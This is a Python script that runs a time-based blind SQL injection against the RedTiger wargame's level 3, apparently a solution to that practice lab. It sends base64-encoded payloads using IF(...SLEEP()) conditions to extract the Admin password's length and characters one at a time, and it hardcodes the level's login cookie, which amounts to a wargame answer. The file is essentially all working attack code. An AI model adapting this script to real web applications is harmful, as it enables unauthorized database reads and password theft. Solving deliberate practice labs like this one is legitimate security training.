#!/usr/bin/env python3

import requests
import time
import base64

# Target URL and cookie
url = "http://redtiger.labs.overthewire.org/level3.php"
cookies = {"level3login": "feed_the_cat_who_eats_your_bread"}

def test_condition(condition, sleep_time=4):
    """Test if a SQL condition is true using time-based blind injection"""
    payload = f"042211014182140' AND IF({condition}, SLEEP({sleep_time}), 0)--"
    encoded_payload = base64.b64encode(payload.encode()).decode()
    
    start_time = time.time()
    try:
        response = requests.get(f"{url}?usr={encoded_payload}", cookies=cookies, timeout=sleep_time + 2)
        end_time = time.time()
        elapsed = end_time - start_time
        print(f"Condition: {condition}, Elapsed: {elapsed:.2f} seconds")
        return elapsed > (sleep_time - 1)
    except requests.exceptions.Timeout:
        print(f"Condition: {condition}, Timeout occurred")
        return True

def get_password_length():
    """Get the length of the Admin password"""
    for length in range(1, 50):
        condition = f"(SELECT LENGTH(password) FROM level3_users WHERE username='Admin')={length}"
        if test_condition(condition):
            return length
    return None

def get_password_char(position):
    """Get the character at the given position (1-based) using ASCII values"""
    # Try common characters first: letters, digits, underscore, etc.
    common_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()[]{}-+=<>?/\\|~`"
    
    for char in common_chars:
        condition = f"SUBSTRING((SELECT password FROM level3_users WHERE username='Admin'), {position}, 1)='{char}'"
        if test_condition(condition):
            return char
    
    # If not found in common chars, try all printable ASCII
    for ascii_val in range(32, 127):
        char = chr(ascii_val)
        if char in common_chars:
            continue
        condition = f"SUBSTRING((SELECT password FROM level3_users WHERE username='Admin'), {position}, 1)='{char}'"
        if test_condition(condition):
            return char
    
    return None

def main():
    print("Getting password length...")
    password_length = get_password_length()
    if password_length is None:
        print("Could not determine password length")
        return
    
    print(f"Password length: {password_length}")
    
    password = ""
    for i in range(1, password_length + 1):
        print(f"Getting character {i}...")
        char = get_password_char(i)
        if char is None:
            print(f"Could not get character {i}")
            break
        password += char
        print(f"Password so far: {password}")
    
    print(f"Final password: {password}")

if __name__ == "__main__":
    main()